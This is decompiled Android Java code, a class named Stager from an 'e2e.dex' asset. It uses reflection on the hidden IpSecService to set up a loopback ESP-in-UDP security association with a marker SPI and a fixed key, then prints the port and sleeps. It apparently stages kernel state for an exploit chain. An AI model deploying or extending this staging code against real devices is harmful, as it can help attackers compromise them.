package q3;

import android.os.Binder;
import androidx.compose.ui.graphics.Fields;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

/* loaded from: assets/fugu/e2e.dex */
public class Stager {
    static Object svc;

    static Class<?> C(String str) throws Exception {
        return Class.forName(str);
    }

    static Object call(String str, Class<?>[] clsArr, Object... objArr) throws Exception {
        try {
            return C("android.net.IIpSecService").getMethod(str, clsArr).invoke(svc, objArr);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(str + " -> " + e.getCause());
        }
    }

    static int fi(Object obj, String str) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(str);
        declaredField.setAccessible(true);
        return declaredField.getInt(obj);
    }

    public static void main(String[] strArr) throws Exception {
        byte[] bArr = new byte[20];
        for (int i = 0; i < 20; i++) {
            bArr[i] = (byte) (i + 65);
        }
        int parseInt = strArr.length > 0 ? Integer.parseInt(strArr[0]) : 600;
        svc = C("android.net.IIpSecService$Stub").getMethod("asInterface", C("android.os.IBinder")).invoke(null, C("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, "ipsec"));
        Class<?> C = C("android.os.IBinder");
        Binder binder = new Binder();
        Object call = call("openUdpEncapsulationSocket", new Class[]{Integer.TYPE, C}, 0, binder);
        int fi = fi(call, "resourceId");
        int fi2 = fi(call, "port");
        Object call2 = call("allocateSecurityParameterIndex", new Class[]{String.class, Integer.TYPE, C}, "127.0.0.1", -559038960, binder);
        int fi3 = fi(call2, "resourceId");
        int fi4 = fi(call2, "spi");
        Object newInstance = C("android.net.IpSecAlgorithm").getConstructor(String.class, byte[].class, Integer.TYPE).newInstance("rfc4106(gcm(aes))", bArr, Integer.valueOf(Fields.SpotShadowColor));
        Class<?> C2 = C("android.net.IpSecConfig");
        Object newInstance2 = C2.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);
        C2.getMethod("setMode", Integer.TYPE).invoke(newInstance2, 0);
        C2.getMethod("setSourceAddress", String.class).invoke(newInstance2, "127.0.0.1");
        C2.getMethod("setDestinationAddress", String.class).invoke(newInstance2, "127.0.0.1");
        C2.getMethod("setSpiResourceId", Integer.TYPE).invoke(newInstance2, Integer.valueOf(fi3));
        C2.getMethod("setEncapType", Integer.TYPE).invoke(newInstance2, 2);
        C2.getMethod("setEncapSocketResourceId", Integer.TYPE).invoke(newInstance2, Integer.valueOf(fi));
        C2.getMethod("setEncapRemotePort", Integer.TYPE).invoke(newInstance2, Integer.valueOf(fi2));
        C2.getMethod("setAuthenticatedEncryption", C("android.net.IpSecAlgorithm")).invoke(newInstance2, newInstance);
        System.out.println("SA status=" + fi(call("createTransform", new Class[]{C2, C, String.class}, newInstance2, binder, "com.android.shell"), "status") + " spi=0x" + Integer.toHexString(fi4));
        System.out.println("ENCAPPORT=" + fi2);
        System.out.flush();
        Thread.sleep(parseInt * 1000);
    }
}
